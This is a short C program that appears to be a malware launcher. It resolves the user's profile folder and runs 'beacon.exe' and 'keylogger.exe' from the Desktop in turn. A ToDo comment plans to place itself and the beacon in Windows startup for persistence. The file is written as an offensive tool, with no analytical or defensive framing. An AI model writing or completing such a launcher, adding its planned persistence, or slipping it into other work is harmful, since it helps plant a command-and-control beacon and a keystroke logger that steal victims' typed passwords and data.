#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"


int main() {
    const size_t bufferLen = 300;
    char *userProfilePath = getenv("UserProfile");
    int return_val;
    
    /* 
        ToDo: Place self and beacon.exe in startup
    */

    char beaconPath[bufferLen];
    snprintf(beaconPath, bufferLen, "%s\\Desktop\\beacon.exe", userProfilePath);
    return_val = run_command(beaconPath);
    if (return_val != 0) {
        return return_val;
    }

    char keyloggerPath[bufferLen];
    snprintf(keyloggerPath, bufferLen, "%s\\Desktop\\keylogger.exe", userProfilePath);
    return run_command(keyloggerPath);
}